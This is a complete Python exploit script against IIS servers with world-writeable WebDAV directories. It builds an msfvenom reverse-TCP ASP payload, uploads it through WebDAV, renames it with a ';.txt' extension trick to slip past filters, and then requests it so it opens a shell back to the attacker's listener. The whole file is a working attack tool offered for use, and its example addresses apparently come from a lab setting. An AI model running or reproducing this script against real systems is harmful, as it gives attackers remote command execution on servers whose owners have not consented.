#!/usr/bin/env python
#
# Script name      : webdav_exploit.py
# Req Modules      : easywebdav, webdavclient
# Note             : Using Kali GNU/Linux Rolling for msfvenom
# Author           : wetw0rk
# Version          : 2.0
# Python Version   : 2.7
# Description      : Execute and upload a ASP payload on a IIS server that has
#		     world-writeable directories via a WebDav PUT request.
#

import os, sys, urllib2, subprocess, time

# Check for uncommon modules
try:
	import easywebdav
except:
	print "[-] easywebdav not installed"
	ans = raw_input("[Y/N] Install > ")
	if ans == 'Y':
		os.system("pip install easywebdav")
	else:
		print "[X] Exiting"
		sys.exit()
try:
	import webdav.client as wc
except:
	print "[-] webdavclient not installed"
	ans = raw_input("[Y/N] Install > ")
	if ans == 'Y':
		os.system("sudo apt-get install libxml2-dev libxslt-dev python-dev")
		os.system("sudo apt-get install libcurl4-openssl-dev python-pycurl")
		os.system("sudo pip install webdavclient")
	else:
		print "[X] Exiting"
		sys.exit()
try:

	LHOST	= "LHOST=" + str(sys.argv[1])
	LPORT	= "LPORT=" + str(sys.argv[2])
	PAYLOAD = "windows/shell_reverse_tcp"
	TARGET	= str(sys.argv[3])

except IndexError:

	print "Usage: %s <lhost> <lport> <target>" % sys.argv[0]
	print "Example: %s 10.11.0.211 42 10.11.1.14" % sys.argv[0]
	sys.exit()

def malicous_asp(LHOST, LPORT, PAYLOAD):

	# msfvenom command to create asp payload
	print "[*] Generating ASP payload"
	print "[!] Have a listener ready"
	try:
		create_payload = subprocess.Popen(
			['msfvenom', '-p', PAYLOAD, LHOST, LPORT,
				'-f', 'asp'], stdout=subprocess.PIPE).communicate()[0]
	except:
		print "[!] MSFVENOM NOT INSTALLED"
		sys.exit()
	# writing payload to a file
	print "[*] Payload generated writing to file"
	payload_file = open('not_a_shell.asp', 'w')
	payload_file.write(create_payload)
	payload_file.close()

def upload_asp(TARGET):

	# create a webdav object
	print "[*] Connecting to %s" % TARGET
	webdav = easywebdav.connect(TARGET)
	# upload the file
	print "[*] Uploading payload to %s" % TARGET
	try:
		webdav.upload("not_a_shell.asp", "not_a_shell.asp;.txt")
		# use different client to move file
		options = {'webdav_hostname': TARGET}
		client = wc.Client(options)
		client.move(remote_path_from="not_a_shell.asp;.txt", remote_path_to="not_a_shell.asp")
	except:
		# if move fails try copy
		print "[*] Encountered an error"
		print "[*] Adjusting payload"
		webdav = easywebdav.connect(TARGET)
		webdav.upload("not_a_shell.asp", "not_a_shell.txt")
		options = {'webdav_hostname': TARGET}
		client = wc.Client(options)
		client.copy(remote_path_from="not_a_shell.txt", remote_path_to="not_a_shell.asp;.txt")

def execute_asp(TARGET):

	# request url then open it
	print "[!] You Have 2 Seconds For That Handler"
	time.sleep(2)
	print "[+] Executing Payload 4 Da Shellz"
	url = "http://" + TARGET + "/not_a_shell.asp"
	r = urllib2.Request(url)
	response = urllib2.urlopen(r)

def execute_again(TARGET):

	url = "http://" + TARGET + "/not_a_shell.asp;.txt"
	r = urllib2.Request(url)
	response = urllib2.urlopen(r)

malicous_asp(LHOST, LPORT, PAYLOAD)
upload_asp(TARGET)
# Incase we got an error
try:
	execute_asp(TARGET)
except:
	print "[-] Execution Failed Trying Again"
	execute_again(TARGET)
	print "[?] Did You Get A Shell?"

